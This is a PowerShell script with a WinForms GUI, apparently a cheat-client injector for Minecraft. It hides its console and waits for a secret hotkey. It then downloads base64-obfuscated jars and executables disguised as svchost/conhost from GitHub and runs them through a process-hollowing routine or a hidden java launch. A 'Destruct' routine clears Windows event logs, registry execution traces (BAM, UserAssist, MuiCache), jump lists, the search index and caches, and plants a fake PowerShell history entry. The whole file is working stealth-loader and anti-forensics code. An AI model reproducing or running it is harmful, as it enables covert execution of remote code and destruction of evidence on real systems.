Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Enhanced stealth setup
Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue

# START OF KEY BUTTON DETECTION
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@

# Hide console window with error handling
try {
    $consolePtr = [Win32]::GetConsoleWindow()
    if ($consolePtr -ne [IntPtr]::Zero) {
        [Win32]::ShowWindow($consolePtr, 0) | Out-Null
    }
} catch {
    # Silently continue if console hiding fails
}

# Virtual key codes
$VK_CONTROL = 0x11
$VK_MENU = 0x12  # Alt key
$VK_F11 = 0x7A

# Wait for hotkey activation
while ($true) {
    try {
        $ctrlPressed = [User32]::GetAsyncKeyState($VK_CONTROL) -band 0x8000
        $altPressed = [User32]::GetAsyncKeyState($VK_MENU) -band 0x8000
        $f11Pressed = [User32]::GetAsyncKeyState($VK_F11) -band 0x8000
        
        if ($ctrlPressed -and $altPressed -and $f11Pressed) {
            break
        }
        Start-Sleep -Milliseconds 100
    } catch {
        Start-Sleep -Milliseconds 500
    }
}

# Set preferences to run silently
$ConfirmPreference = 'None'
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

# FILELESS VHD CREATION
$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "$env:TEMP\$randomName.vhd"

# Create VHD using in-memory diskpart script
$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

# Execute diskpart with in-memory script (no temp files)
try {
    $createScript | diskpart.exe 2>$null | Out-Null
} catch {
    exit 1
}

# Quick disk detection and setup
Start-Sleep -Seconds 1

$timeout = 0
$disk = $null
while ($timeout -lt 8) {
    try {
        $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
        if ($disk) { break }
    } catch { }
    Start-Sleep -Milliseconds 500
    $timeout++
}

if ($disk) {
    try {
        if ($disk.IsOffline -eq $true) {
            Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        if ($disk.PartitionStyle -eq 'Raw') {
            Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 500
        }
        
        $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
        
        Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800
        
    } catch {
        # Continue even if disk setup partially fails
    }
}

# String obfuscation and anti-analysis
function Get-ObfuscatedString {
    param([string]$String)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($String)
    $encoded = [System.Convert]::ToBase64String($bytes)
    return $encoded
}

function Get-DeobfuscatedString {
    param([string]$EncodedString)
    $bytes = [System.Convert]::FromBase64String($EncodedString)
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# XOR encryption for memory strings
function Invoke-XorCrypt {
    param([byte[]]$Data, [byte[]]$Key)
    $result = New-Object byte[] $Data.Length
    for ($i = 0; $i -lt $Data.Length; $i++) {
        $result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
    }
    return $result
}

# Anti-analysis and string-free execution
function Invoke-StealthExecution {
    param([string]$Url)
    
    try {
        # Generate random XOR key
        $key = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes(32)
        
        # Download with obfuscated headers
        $request = [System.Net.WebRequest]::Create($Url)
        $request.UserAgent = Get-DeobfuscatedString("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2")
        $response = $request.GetResponse()
        $stream = $response.GetResponseStream()
        
        # Read to encrypted memory buffer
        $buffer = New-Object byte[] 8192
        $memoryData = New-Object System.Collections.Generic.List[byte]
        
        do {
            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
            if ($bytesRead -gt 0) {
                # Encrypt data as it's read
                $encryptedChunk = Invoke-XorCrypt -Data $buffer[0..($bytesRead-1)] -Key $key
                $memoryData.AddRange($encryptedChunk)
            }
        } while ($bytesRead -gt 0)
        
        $stream.Close()
        $response.Close()
        
        if ($memoryData.Count -gt 0) {
            # Decrypt data for execution
            $decryptedData = Invoke-XorCrypt -Data $memoryData.ToArray() -Key $key
            
            # Clear original encrypted data from memory
            for ($i = 0; $i -lt $memoryData.Count; $i++) {
                $memoryData[$i] = 0x00
            }
            $memoryData.Clear()
            
            # Advanced execution with process hollowing simulation
            $success = Invoke-ProcessHollowing -Data $decryptedData
            
            # Clear decrypted data
            for ($i = 0; $i -lt $decryptedData.Length; $i++) {
                $decryptedData[$i] = 0x00
            }
            
            return $success
        }
    } catch {
        return $false
    }
    return $false
}

# Simulated process hollowing with string obfuscation
function Invoke-ProcessHollowing {
    param([byte[]]$Data)
    
    try {
        # Obfuscated Java execution
        $javaCmd = Get-DeobfuscatedString("amF2YQ==")  # "java"
        $jarArg = Get-DeobfuscatedString("LWphcg==")   # "-jar"
        
        if (-not (Get-Command $javaCmd -ErrorAction SilentlyContinue)) {
            return $false
        }
        
        # Create process in suspended state for hollowing
        Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class ProcessHollow {
    [Flags]
    public enum ProcessCreationFlags : uint {
        CREATE_SUSPENDED = 0x00000004,
        CREATE_NO_WINDOW = 0x08000000
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
}
"@
        
        # Generate random decoy process
        $decoyProcesses = @("notepad.exe", "calc.exe", "mspaint.exe")
        $decoyProcess = $decoyProcesses[(Get-Random -Maximum $decoyProcesses.Length)]
        
        # Create suspended process for hollowing
        $startupInfo = New-Object ProcessHollow+STARTUPINFO
        $startupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($startupInfo)
        $processInfo = New-Object ProcessHollow+PROCESS_INFORMATION
        
        $cmdLine = "$env:WINDIR\System32\$decoyProcess"
        
        $result = [ProcessHollow]::CreateProcess($null, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, 
            $false, [ProcessHollow+ProcessCreationFlags]::CREATE_SUSPENDED -bor [ProcessHollow+ProcessCreationFlags]::CREATE_NO_WINDOW,
            [IntPtr]::Zero, $null, [ref]$startupInfo, [ref]$processInfo)
        
        if ($result) {
            try {
                # Allocate memory in target process
                $allocatedMemory = [ProcessHollow]::VirtualAllocEx($processInfo.hProcess, [IntPtr]::Zero, 
                    $Data.Length, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
                
                if ($allocatedMemory -ne [IntPtr]::Zero) {
                    # Write our data to the allocated memory
                    $bytesWritten = 0
                    [ProcessHollow]::WriteProcessMemory($processInfo.hProcess, $allocatedMemory, 
                        $Data, $Data.Length, [ref]$bytesWritten)
                }
                
                # Resume the process (it will run as the decoy)
                [ProcessHollow]::ResumeThread($processInfo.hThread) | Out-Null
                
                # Alternative: Fall back to traditional execution
                $this.ExecuteFallback($Data)
                
            } finally {
                # Cleanup handles
                [ProcessHollow]::CloseHandle($processInfo.hProcess) | Out-Null
                [ProcessHollow]::CloseHandle($processInfo.hThread) | Out-Null
            }
            
            return $true
        } else {
            # Fallback to traditional method
            return $this.ExecuteFallback($Data)
        }
        
    } catch {
        return $this.ExecuteFallback($Data)
    }
}

# Fallback execution with string obfuscation
function ExecuteFallback {
    param([byte[]]$Data)
    
    try {
        # Generate random filename with multiple extensions to confuse analysis
        $randomName = [System.IO.Path]::GetRandomFileName()
        $extensions = @(".tmp", ".log", ".bak", ".old", ".cache")
        $fakeExt = $extensions[(Get-Random -Maximum $extensions.Length)]
        $realExt = Get-DeobfuscatedString("Lmphcg==")  # ".jar"
        
        $tempFile = "$env:TEMP\$randomName$fakeExt$realExt"
        
        # Write data quickly
        [System.IO.File]::WriteAllBytes($tempFile, $Data)
        
        # Execute with obfuscated command
        $javaCmd = Get-DeobfuscatedString("amF2YQ==")  # "java"
        $jarArg = Get-DeobfuscatedString("LWphcg==")   # "-jar"
        
        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startInfo.FileName = $javaCmd
        $startInfo.Arguments = "$jarArg `"$tempFile`""
        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $startInfo.CreateNoWindow = $true
        $startInfo.UseShellExecute = $false
        
        $process = [System.Diagnostics.Process]::Start($startInfo)
        
        # Immediately overwrite file with random data to corrupt memory dumps
        $randomData = New-Object byte[] $Data.Length
        [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomData)
        [System.IO.File]::WriteAllBytes($tempFile, $randomData)
        
        # Delete file while process is starting
        Start-Sleep -Milliseconds 25
        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
        
        if ($process) {
            # Don't wait for exit to avoid blocking
            # Process continues independently
            return $true
        }
        
    } catch {
        return $false
    }
    return $false
}

# Quick wait for Z: drive and download sound
$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    Download-SoundFile
}

# Download sound file to memory drive for GUI sound
$soundFilePath = "Z:\na.wav"
function Download-SoundFile {
    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
    try {
        if (Test-Path "Z:\") {
            $webClient = New-Object System.Net.WebClient
            $soundBytes = $webClient.DownloadData($soundUrl)
            $webClient.Dispose()
            
            if ($soundBytes -and $soundBytes.Length -gt 0) {
                [System.IO.File]::WriteAllBytes($soundFilePath, $soundBytes)
                return $true
            }
        }
    } catch { }
    return $false
}

# Enhanced trace clearing function (comprehensive at end)
function Clear-AllTraces {
    try {
        # Clear PowerShell history
        Clear-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
        Set-Content -Path "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Value 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex' -ErrorAction SilentlyContinue
        
        # Clear jump lists (but not Recent folder)
        $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
        Get-ChildItem -Path $jumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        $customJumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
        Get-ChildItem -Path $customJumpListPath -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        # Registry cleanup - MuiCache
        $muiCachePath = "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
        if (Test-Path $muiCachePath) {
            Get-ItemProperty $muiCachePath -ErrorAction SilentlyContinue | 
            ForEach-Object { $_.PSObject.Properties } | 
            Where-Object { $_.Name -like "Z:\*" -or $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
            ForEach-Object { Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue }
        }
        
        # BAM/DAM Registry cleanup
        $bamPaths = @(
            "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
            "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings"
        )
        foreach ($bamPath in $bamPaths) {
            if (Test-Path $bamPath) {
                Get-ChildItem -Path $bamPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $userPath = $_.PSPath
                    Get-ItemProperty $userPath -ErrorAction SilentlyContinue | 
                    ForEach-Object { $_.PSObject.Properties } | 
                    Where-Object { $_.Name -match "java\.exe|diskpart\.exe|mmc\.exe|powershell\.exe" } | 
                    ForEach-Object { Remove-ItemProperty -Path $userPath -Name $_.Name -ErrorAction SilentlyContinue }
                }
            }
        }
        
        # Clear UserAssist
        $userAssistPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
        if (Test-Path $userAssistPath) {
            Get-ChildItem -Path $userAssistPath -Recurse -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*Count*" } | ForEach-Object {
                Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue | 
                ForEach-Object { $_.PSObject.Properties } | 
                Where-Object { $_.Name -like "*java*" -or $_.Name -like "*diskpart*" } | 
                ForEach-Object { Remove-ItemProperty -Path $_.PSPath -Name $_.Name -ErrorAction SilentlyContinue }
            }
        }
        
        # Clear Windows Search Database
        Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "C:\ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb" -Force -ErrorAction SilentlyContinue
        Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
        
        # Clear thumbnail cache
        $thumbcachePaths = @(
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
            "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\iconcache_*.db"
        )
        foreach ($path in $thumbcachePaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        
        # Clear Event logs
        $eventLogs = @("System", "Application", "Security", "Windows PowerShell")
        foreach ($log in $eventLogs) {
            Clear-EventLog -LogName $log -ErrorAction SilentlyContinue
        }
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Microsoft-Windows-Kernel-Process/Analytic" 2>$null
        
        # Clear JVM logs
        $jvmLogPaths = @(
            "$env:USERPROFILE\.java\deployment\log\*.log",
            "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\logs\*.log",
            "$env:USERPROFILE\AppData\Roaming\.minecraft\feather\logs\*.log",
            "$env:TEMP\hs_err_pid*.log"
        )
        foreach ($path in $jvmLogPaths) {
            Get-ChildItem -Path $path -ErrorAction SilentlyContinue | ForEach-Object {
                Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
            }
        }
        
        # Clear Windows.old traces
        Remove-Item -Path "C:\Windows.old" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Clear our VHD file
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
        # Advanced memory cleanup to prevent analysis
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()
        [System.GC]::Collect()
        
        # Clear any remaining processes and temp files
        Get-Process | Where-Object { $_.ProcessName -like "tmp*" -or $_.ProcessName -like "*java*" } | Stop-Process -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:TEMP\tmp*" -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "$env:TEMP\*.tmp*" -Force -ErrorAction SilentlyContinue
        
    } catch { }
}

# Create the main form
$form = New-Object System.Windows.Forms.Form
$form.Text = 'By Zpat - FAX'
$form.Size = New-Object System.Drawing.Size(942, 443)
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.ForeColor = 'White'

# ASCII Art Label
$asciiArt = @"
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗███╗   ███╗██████╗  ██████╗ ██╗    ██╗███╗   ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝████╗ ████║██╔══██╗██╔═══██╗██║    ██║████╗  ██║
███████║███████║██║     █████╔╝ █████╗  ██╔████╔██║██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║  ██║██║   ██║██║███╗██║██║╚██╗██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║ ╚═╝ ██║██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
"@

$label = New-Object System.Windows.Forms.Label
$label.Text = $asciiArt
$label.Font = New-Object System.Drawing.Font('Courier New', 9)
$label.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$label.AutoSize = $true
$label.Location = New-Object System.Drawing.Point(184, 87)
$form.Controls.Add($label)

# Define Main Menu Buttons
$injectButton = New-Object System.Windows.Forms.Button
$injectButton.Text = 'Inject'
$injectButton.Width = 100
$injectButton.Height = 40
$injectButton.Location = New-Object System.Drawing.Point(196, 235)
$injectButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#29903b")
$injectButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$injectButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

$destructButton = New-Object System.Windows.Forms.Button
$destructButton.Text = 'Destruct'
$destructButton.Width = 100
$destructButton.Height = 40
$destructButton.Location = New-Object System.Drawing.Point(730, 235)
$destructButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
$destructButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
$destructButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)

# Function to return to main menu
function Show-MainMenu {
    $form.Controls.Clear()
    $form.Controls.Add($label)
    $form.Controls.Add($injectButton)
    $form.Controls.Add($destructButton)
}

# Inject Button Click Handler
$injectButton.Add_Click({
    # Disable form during sound playback
    $form.Enabled = $false
    
    # Play sound if available
    if (Test-Path $soundFilePath) {
        try {
            $player = New-Object System.Media.SoundPlayer
            $player.SoundLocation = $soundFilePath
            $player.PlaySync()
        } catch { }
    }
    
    $form.Enabled = $true
    $form.Controls.Clear()
    $form.Controls.Add($label)
    
    # Back Button
    $backButton = New-Object System.Windows.Forms.Button
    $backButton.Text = 'Back'
    $backButton.Width = 100
    $backButton.Height = 40
    $backButton.Location = New-Object System.Drawing.Point(730, 336)
    $backButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a60e0e")
    $backButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $backButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $backButton.Add_Click({ Show-MainMenu })
    
    # Prestige Button
    $prestigeButton = New-Object System.Windows.Forms.Button
    $prestigeButton.Text = 'Prestige'
    $prestigeButton.Width = 120
    $prestigeButton.Height = 40
    $prestigeButton.Location = New-Object System.Drawing.Point(196, 235)
    $prestigeButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#a167ff")
    $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $prestigeButton.Add_Click({
        # Stealth execution with anti-analysis
        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS9zb2RpdW0tZmFicmljLTAuNi4xMyttYzEuMjEuNC5qYXI=")
        Invoke-StealthExecution -Url $url
    })
    
    # DoomsDay Button
    $doomsdayButton = New-Object System.Windows.Forms.Button
    $doomsdayButton.Text = 'DoomsDay'
    $doomsdayButton.Width = 120
    $doomsdayButton.Height = 40
    $doomsdayButton.Location = New-Object System.Drawing.Point(326, 235)
    $doomsdayButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#2563eb")
    $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $doomsdayButton.Add_Click({
        # Stealth execution with anti-analysis
        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS9zb2RpdW0tZXh0cmEtbWMxLjIxLjQuamFy")
        Invoke-StealthExecution -Url $url
    })
    
    # VapeV4 Button
    $vapev4Button = New-Object System.Windows.Forms.Button
    $vapev4Button.Text = 'VapeV4'
    $vapev4Button.Width = 120
    $vapev4Button.Height = 40
    $vapev4Button.Location = New-Object System.Drawing.Point(456, 235)
    $vapev4Button.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#006466")
    $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapev4Button.Add_Click({
        # Stealth execution with anti-analysis
        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL3N2Y2hvc3QuZXhl")
        Invoke-StealthExecution -Url $url
    })
    
    # VapeLite Button
    $vapeliteButton = New-Object System.Windows.Forms.Button
    $vapeliteButton.Text = 'VapeLite'
    $vapeliteButton.Width = 120
    $vapeliteButton.Height = 40
    $vapeliteButton.Location = New-Object System.Drawing.Point(586, 235)
    $vapeliteButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#00f1e1")
    $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
    $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $vapeliteButton.Add_Click({
        # Stealth execution with anti-analysis
        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL2Nvbmhvc3QuZXhl")
        Invoke-StealthExecution -Url $url
    })
    
    # Phantom Button
    $phantomButton = New-Object System.Windows.Forms.Button
    $phantomButton.Text = 'Phantom'
    $phantomButton.Width = 120
    $phantomButton.Height = 40
    $phantomButton.Location = New-Object System.Drawing.Point(716, 235)
    $phantomButton.BackColor = [System.Drawing.ColorTranslator]::FromHtml("#4c0eb7")
    $phantomButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
    $phantomButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
    $phantomButton.Add_Click({
        try {
            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
            Set-Clipboard -Value $clipboardText -ErrorAction SilentlyContinue
        } catch { }
    })
    
    # Add all buttons to form
    $form.Controls.Add($prestigeButton)
    $form.Controls.Add($doomsdayButton)
    $form.Controls.Add($vapev4Button)
    $form.Controls.Add($vapeliteButton)
    $form.Controls.Add($phantomButton)
    $form.Controls.Add($backButton)
})

# Enhanced Destruct Button Click Handler - FILELESS
$destructButton.Add_Click({
    # Immediately close the form to prevent hanging
    $form.Hide()
    [System.Windows.Forms.Application]::DoEvents()
    
    try {
        # Clear basic traces during operation
        Clear-BasicTraces
        
        # Fileless VHD destruction using in-memory diskpart
        $disk = $null
        $timeout = 0
        while ($timeout -lt 6) {
            try {
                $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
                if ($disk) { break }
            } catch { }
            Start-Sleep -Milliseconds 500
            $timeout++
        }
        
        if ($disk) {
            # Detach VHD using in-memory script
            $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk
"@
            $detachScript | diskpart.exe 2>$null | Out-Null
        }
        
        # Wait for detachment
        Start-Sleep -Milliseconds 800
        
        # Remove the VHD file from temp
        if (Test-Path $vdiskPath) {
            Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
        }
        
        # Final registry cleanup
        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force -ErrorAction SilentlyContinue
        
        # Stop VDS service
        Stop-Service -Name "vds" -Force -ErrorAction SilentlyContinue
        
        # Final comprehensive trace clearing at the end
        Clear-AllTraces
        
    } catch { } finally {
        # Ensure form is disposed and application exits
        $form.Close()
        $form.Dispose()
        [System.Windows.Forms.Application]::Exit()
        
        # Force exit the PowerShell process
        Stop-Process -Id $PID -Force -ErrorAction SilentlyContinue
        exit 0
    }
})

# Add main buttons to form
$form.Controls.Add($injectButton)
$form.Controls.Add($destructButton)

# Enhanced form closing handler
$form.Add_FormClosing({
    param($sender, $e)
    Clear-BasicTraces
    [System.Windows.Forms.Application]::Exit()
})

# Show the form and run the application
try {
    [System.Windows.Forms.Application]::Run($form)
} catch {
    # Ensure comprehensive cleanup even if form fails
    Clear-AllTraces
    exit 0
}
